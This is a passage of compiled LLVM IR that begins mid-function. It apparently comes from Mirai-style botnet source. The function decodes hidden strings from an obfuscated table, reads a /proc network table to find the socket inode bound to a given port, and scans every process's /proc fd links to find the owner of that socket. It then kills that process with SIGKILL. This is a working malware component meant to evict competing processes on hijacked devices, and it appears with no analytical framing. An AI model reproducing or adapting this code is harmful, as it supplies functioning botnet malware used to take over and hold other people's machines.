  %39 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 2
  store i8 %38, i8* %39, align 2
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 1
  %41 = load i8, i8* %40, align 1
  %42 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 3
  store i8 %41, i8* %42, align 1
  %43 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 4
  store i8 0, i8* %43, align 4
  %44 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  store i8 48, i8* %44, align 16
  %45 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 1
  store i8 48, i8* %45, align 1
  br label %46

46:                                               ; preds = %36, %1
  call void @table_unlock_val(i8 zeroext 1)
  call void @table_unlock_val(i8 zeroext 2)
  call void @table_unlock_val(i8 zeroext 3)
  call void @table_unlock_val(i8 zeroext 4)
  %47 = call i8* @table_retrieve_val(i32 4, i32* null)
  %48 = call i32 (i8*, i32, ...) @open(i8* %47, i32 0)
  store i32 %48, i32* %11, align 4
  %49 = load i32, i32* %11, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  store i8 0, i8* %2, align 1
  br label %367

52:                                               ; preds = %46
  br label %53

53:                                               ; preds = %221, %214, %183, %85, %52
  %54 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 0
  %55 = load i32, i32* %11, align 4
  %56 = call i8* @util_fdgets(i8* %54, i32 512, i32 %55)
  %57 = icmp ne i8* %56, null
  br i1 %57, label %58, label %222

58:                                               ; preds = %53
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  br label %59

59:                                               ; preds = %75, %58
  %60 = load i32, i32* %16, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = icmp ne i32 %64, 0
  br i1 %65, label %66, label %73

66:                                               ; preds = %59
  %67 = load i32, i32* %16, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = icmp ne i32 %71, 58
  br label %73

73:                                               ; preds = %66, %59
  %74 = phi i1 [ false, %59 ], [ %72, %66 ]
  br i1 %74, label %75, label %78

75:                                               ; preds = %73
  %76 = load i32, i32* %16, align 4
  %77 = add nsw i32 %76, 1
  store i32 %77, i32* %16, align 4
  br label %59, !llvm.loop !13

78:                                               ; preds = %73
  %79 = load i32, i32* %16, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %80
  %82 = load i8, i8* %81, align 1
  %83 = sext i8 %82 to i32
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %86

85:                                               ; preds = %78
  br label %53, !llvm.loop !14

86:                                               ; preds = %78
  %87 = load i32, i32* %16, align 4
  %88 = add nsw i32 %87, 2
  store i32 %88, i32* %16, align 4
  %89 = load i32, i32* %16, align 4
  store i32 %89, i32* %17, align 4
  br label %90

90:                                               ; preds = %106, %86
  %91 = load i32, i32* %16, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %92
  %94 = load i8, i8* %93, align 1
  %95 = sext i8 %94 to i32
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %104

97:                                               ; preds = %90
  %98 = load i32, i32* %16, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %99
  %101 = load i8, i8* %100, align 1
  %102 = sext i8 %101 to i32
  %103 = icmp ne i32 %102, 32
  br label %104

104:                                              ; preds = %97, %90
  %105 = phi i1 [ false, %90 ], [ %103, %97 ]
  br i1 %105, label %106, label %109

106:                                              ; preds = %104
  %107 = load i32, i32* %16, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %16, align 4
  br label %90, !llvm.loop !15

109:                                              ; preds = %104
  %110 = load i32, i32* %16, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %16, align 4
  %112 = sext i32 %110 to i64
  %113 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %112
  store i8 0, i8* %113, align 1
  %114 = load i32, i32* %17, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %115
  %117 = load i32, i32* %17, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %118
  %120 = call i32 @util_strlen(i8* %119)
  %121 = getelementptr inbounds [16 x i8], [16 x i8]* %15, i64 0, i64 0
  %122 = call i32 @util_stristr(i8* %116, i32 %120, i8* %121)
  %123 = icmp ne i32 %122, -1
  br i1 %123, label %124, label %221

124:                                              ; preds = %109
  store i32 0, i32* %18, align 4
  store i8 0, i8* %19, align 1
  store i8 0, i8* %20, align 1
  br label %125

125:                                              ; preds = %177, %124
  %126 = load i32, i32* %18, align 4
  %127 = icmp slt i32 %126, 7
  br i1 %127, label %128, label %136

128:                                              ; preds = %125
  %129 = load i32, i32* %16, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %16, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %131
  %133 = load i8, i8* %132, align 1
  %134 = sext i8 %133 to i32
  %135 = icmp ne i32 %134, 0
  br label %136

136:                                              ; preds = %128, %125
  %137 = phi i1 [ false, %125 ], [ %135, %128 ]
  br i1 %137, label %138, label %178

138:                                              ; preds = %136
  %139 = load i32, i32* %16, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %140
  %142 = load i8, i8* %141, align 1
  %143 = sext i8 %142 to i32
  %144 = icmp eq i32 %143, 32
  br i1 %144, label %152, label %145

145:                                              ; preds = %138
  %146 = load i32, i32* %16, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %147
  %149 = load i8, i8* %148, align 1
  %150 = sext i8 %149 to i32
  %151 = icmp eq i32 %150, 9
  br i1 %151, label %152, label %153

152:                                              ; preds = %145, %138
  store i8 1, i8* %19, align 1
  br label %177

153:                                              ; preds = %145
  %154 = load i8, i8* %19, align 1
  %155 = sext i8 %154 to i32
  %156 = icmp eq i32 %155, 1
  br i1 %156, label %157, label %160

157:                                              ; preds = %153
  %158 = load i32, i32* %18, align 4
  %159 = add nsw i32 %158, 1
  store i32 %159, i32* %18, align 4
  br label %160

160:                                              ; preds = %157, %153
  %161 = load i8, i8* %19, align 1
  %162 = sext i8 %161 to i32
  %163 = icmp eq i32 %162, 1
  br i1 %163, label %164, label %176

164:                                              ; preds = %160
  %165 = load i32, i32* %18, align 4
  %166 = icmp eq i32 %165, 1
  br i1 %166, label %167, label %176

167:                                              ; preds = %164
  %168 = load i32, i32* %16, align 4
  %169 = add nsw i32 %168, 1
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %174 = icmp eq i32 %173, 65
  br i1 %174, label %175, label %176

175:                                              ; preds = %167
  store i8 1, i8* %20, align 1
  br label %176

176:                                              ; preds = %175, %167, %164, %160
  store i8 0, i8* %19, align 1
  br label %177

177:                                              ; preds = %176, %152
  br label %125, !llvm.loop !16

178:                                              ; preds = %136
  %179 = load i32, i32* %16, align 4
  store i32 %179, i32* %17, align 4
  %180 = load i8, i8* %20, align 1
  %181 = sext i8 %180 to i32
  %182 = icmp eq i32 %181, 0
  br i1 %182, label %183, label %184

183:                                              ; preds = %178
  br label %53, !llvm.loop !14

184:                                              ; preds = %178
  br label %185

185:                                              ; preds = %201, %184
  %186 = load i32, i32* %16, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %187
  %189 = load i8, i8* %188, align 1
  %190 = sext i8 %189 to i32
  %191 = icmp ne i32 %190, 0
  br i1 %191, label %192, label %199

192:                                              ; preds = %185
  %193 = load i32, i32* %16, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %194
  %196 = load i8, i8* %195, align 1
  %197 = sext i8 %196 to i32
  %198 = icmp ne i32 %197, 32
  br label %199

199:                                              ; preds = %192, %185
  %200 = phi i1 [ false, %185 ], [ %198, %192 ]
  br i1 %200, label %201, label %204

201:                                              ; preds = %199
  %202 = load i32, i32* %16, align 4
  %203 = add nsw i32 %202, 1
  store i32 %203, i32* %16, align 4
  br label %185, !llvm.loop !17

204:                                              ; preds = %199
  %205 = load i32, i32* %16, align 4
  %206 = add nsw i32 %205, 1
  store i32 %206, i32* %16, align 4
  %207 = sext i32 %205 to i64
  %208 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %207
  store i8 0, i8* %208, align 1
  %209 = load i32, i32* %17, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %210
  %212 = call i32 @util_strlen(i8* %211)
  %213 = icmp sgt i32 %212, 15
  br i1 %213, label %214, label %215

214:                                              ; preds = %204
  br label %53, !llvm.loop !14

215:                                              ; preds = %204
  %216 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %217 = load i32, i32* %17, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [513 x i8], [513 x i8]* %10, i64 0, i64 %218
  %220 = call i32 @util_strcpy(i8* %216, i8* %219)
  br label %222

221:                                              ; preds = %109
  br label %53, !llvm.loop !14

222:                                              ; preds = %215, %53
  %223 = load i32, i32* %11, align 4
  %224 = call i32 @close(i32 %223)
  %225 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %226 = call i32 @util_strlen(i8* %225)
  %227 = icmp eq i32 %226, 0
  br i1 %227, label %228, label %229

228:                                              ; preds = %222
  call void @table_lock_val(i8 zeroext 1)
  call void @table_lock_val(i8 zeroext 2)
  call void @table_lock_val(i8 zeroext 3)
  call void @table_lock_val(i8 zeroext 4)
  store i8 0, i8* %2, align 1
  br label %367

229:                                              ; preds = %222
  %230 = call i8* @table_retrieve_val(i32 1, i32* null)
  %231 = call %struct.__dirstream* @opendir(i8* %230)
  store %struct.__dirstream* %231, %struct.__dirstream** %4, align 8
  %232 = icmp ne %struct.__dirstream* %231, null
  br i1 %232, label %233, label %364

233:                                              ; preds = %229
  br label %234

234:                                              ; preds = %360, %279, %256, %233
  %235 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %236 = call %struct.dirent* @readdir(%struct.__dirstream* %235)
  store %struct.dirent* %236, %struct.dirent** %6, align 8
  %237 = icmp ne %struct.dirent* %236, null
  br i1 %237, label %238, label %241

238:                                              ; preds = %234
  %239 = load i32, i32* %14, align 4
  %240 = icmp eq i32 %239, 0
  br label %241

241:                                              ; preds = %238, %234
  %242 = phi i1 [ false, %234 ], [ %240, %238 ]
  br i1 %242, label %243, label %361

243:                                              ; preds = %241
  %244 = load %struct.dirent*, %struct.dirent** %6, align 8
  %245 = getelementptr inbounds %struct.dirent, %struct.dirent* %244, i32 0, i32 4
  %246 = getelementptr inbounds [256 x i8], [256 x i8]* %245, i64 0, i64 0
  store i8* %246, i8** %21, align 8
  %247 = load i8*, i8** %21, align 8
  %248 = load i8, i8* %247, align 1
  %249 = sext i8 %248 to i32
  %250 = icmp slt i32 %249, 48
  br i1 %250, label %256, label %251

251:                                              ; preds = %243
  %252 = load i8*, i8** %21, align 8
  %253 = load i8, i8* %252, align 1
  %254 = sext i8 %253 to i32
  %255 = icmp sgt i32 %254, 57
  br i1 %255, label %256, label %257

256:                                              ; preds = %251, %243
  br label %234, !llvm.loop !18

257:                                              ; preds = %251
  %258 = load i8*, i8** %13, align 8
  %259 = call i8* @table_retrieve_val(i32 1, i32* null)
  %260 = call i32 @util_strcpy(i8* %258, i8* %259)
  %261 = load i8*, i8** %13, align 8
  %262 = load i8*, i8** %13, align 8
  %263 = call i32 @util_strlen(i8* %262)
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds i8, i8* %261, i64 %264
  %266 = load i8*, i8** %21, align 8
  %267 = call i32 @util_strcpy(i8* %265, i8* %266)
  %268 = load i8*, i8** %13, align 8
  %269 = load i8*, i8** %13, align 8
  %270 = call i32 @util_strlen(i8* %269)
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds i8, i8* %268, i64 %271
  %273 = call i8* @table_retrieve_val(i32 2, i32* null)
  %274 = call i32 @util_strcpy(i8* %272, i8* %273)
  %275 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %276 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %277 = call i64 @readlink(i8* %275, i8* %276, i64 4096) #6
  %278 = icmp eq i64 %277, -1
  br i1 %278, label %279, label %280

279:                                              ; preds = %257
  br label %234, !llvm.loop !18

280:                                              ; preds = %257
  %281 = load i8*, i8** %13, align 8
  %282 = call i8* @table_retrieve_val(i32 1, i32* null)
  %283 = call i32 @util_strcpy(i8* %281, i8* %282)
  %284 = load i8*, i8** %13, align 8
  %285 = load i8*, i8** %13, align 8
  %286 = call i32 @util_strlen(i8* %285)
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds i8, i8* %284, i64 %287
  %289 = load i8*, i8** %21, align 8
  %290 = call i32 @util_strcpy(i8* %288, i8* %289)
  %291 = load i8*, i8** %13, align 8
  %292 = load i8*, i8** %13, align 8
  %293 = call i32 @util_strlen(i8* %292)
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds i8, i8* %291, i64 %294
  %296 = call i8* @table_retrieve_val(i32 3, i32* null)
  %297 = call i32 @util_strcpy(i8* %295, i8* %296)
  %298 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %299 = call %struct.__dirstream* @opendir(i8* %298)
  store %struct.__dirstream* %299, %struct.__dirstream** %5, align 8
  %300 = icmp ne %struct.__dirstream* %299, null
  br i1 %300, label %301, label %360

301:                                              ; preds = %280
  br label %302

302:                                              ; preds = %356, %344, %301
  %303 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %304 = call %struct.dirent* @readdir(%struct.__dirstream* %303)
  store %struct.dirent* %304, %struct.dirent** %7, align 8
  %305 = icmp ne %struct.dirent* %304, null
  br i1 %305, label %306, label %309

306:                                              ; preds = %302
  %307 = load i32, i32* %14, align 4
  %308 = icmp eq i32 %307, 0
  br label %309

309:                                              ; preds = %306, %302
  %310 = phi i1 [ false, %302 ], [ %308, %306 ]
  br i1 %310, label %311, label %357

311:                                              ; preds = %309
  %312 = load %struct.dirent*, %struct.dirent** %7, align 8
  %313 = getelementptr inbounds %struct.dirent, %struct.dirent* %312, i32 0, i32 4
  %314 = getelementptr inbounds [256 x i8], [256 x i8]* %313, i64 0, i64 0
  store i8* %314, i8** %22, align 8
  %315 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %315, i8 0, i64 4096, i1 false)
  %316 = load i8*, i8** %13, align 8
  %317 = call i8* @table_retrieve_val(i32 1, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  %319 = load i8*, i8** %13, align 8
  %320 = load i8*, i8** %13, align 8
  %321 = call i32 @util_strlen(i8* %320)
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds i8, i8* %319, i64 %322
  %324 = load i8*, i8** %21, align 8
  %325 = call i32 @util_strcpy(i8* %323, i8* %324)
  %326 = load i8*, i8** %13, align 8
  %327 = load i8*, i8** %13, align 8
  %328 = call i32 @util_strlen(i8* %327)
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds i8, i8* %326, i64 %329
  %331 = call i8* @table_retrieve_val(i32 3, i32* null)
  %332 = call i32 @util_strcpy(i8* %330, i8* %331)
  %333 = load i8*, i8** %13, align 8
  %334 = load i8*, i8** %13, align 8
  %335 = call i32 @util_strlen(i8* %334)
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds i8, i8* %333, i64 %336
  %338 = load i8*, i8** %22, align 8
  %339 = call i32 @util_strcpy(i8* %337, i8* %338)
  %340 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i64 0, i64 0
  %341 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %342 = call i64 @readlink(i8* %340, i8* %341, i64 4096) #6
  %343 = icmp eq i64 %342, -1
  br i1 %343, label %344, label %345

344:                                              ; preds = %311
  br label %302, !llvm.loop !19

345:                                              ; preds = %311
  %346 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %347 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %348 = call i32 @util_strlen(i8* %347)
  %349 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %350 = call i32 @util_stristr(i8* %346, i32 %348, i8* %349)
  %351 = icmp ne i32 %350, -1
  br i1 %351, label %352, label %356

352:                                              ; preds = %345
  %353 = load i8*, i8** %21, align 8
  %354 = call i32 @atoi(i8* %353) #7
  %355 = call i32 @kill(i32 %354, i32 9) #6
  store i32 1, i32* %14, align 4
  br label %356

356:                                              ; preds = %352, %345
  br label %302, !llvm.loop !19

357:                                              ; preds = %309
  %358 = load %struct.__dirstream*, %struct.__dirstream** %5, align 8
  %359 = call i32 @closedir(%struct.__dirstream* %358)
  br label %360

360:                                              ; preds = %357, %280
  br label %234, !llvm.loop !18

361:                                              ; preds = %241
  %362 = load %struct.__dirstream*, %struct.__dirstream** %4, align 8
  %363 = call i32 @closedir(%struct.__dirstream* %362)
  br label %364

364:                                              ; preds = %361, %229
  call void @table_lock_val(i8 zeroext 1)
  call void @table_lock_val(i8 zeroext 2)
  call void @table_lock_val(i8 zeroext 3)
  call void @table_lock_val(i8 zeroext 4)
  %365 = load i32, i32* %14, align 4
  %366 = trunc i32 %365 to i8
  store i8 %366, i8* %2, align 1
  br label %367

367:                                              ; preds = %364, %228, %51
  %368 = load i8, i8* %2, align 1
  ret i8 %368
}

declare i8* @util_itoa(i32, i32, i8*) #2

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #5

declare i32 @util_strlen(i8*) #2

declare void @table_unlock_val(i8 zeroext) #2

declare i8* @table_retrieve_val(i32, i32*) #2

declare i8* @util_fdgets(i8*, i32, i32) #2

declare i32 @util_stristr(i8*, i32, i8*) #2

declare i32 @util_strcpy(i8*, i8*) #2

declare void @table_lock_val(i8 zeroext) #2

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { nounwind }
attributes #7 = { nounwind readonly willreturn }
attributes #8 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
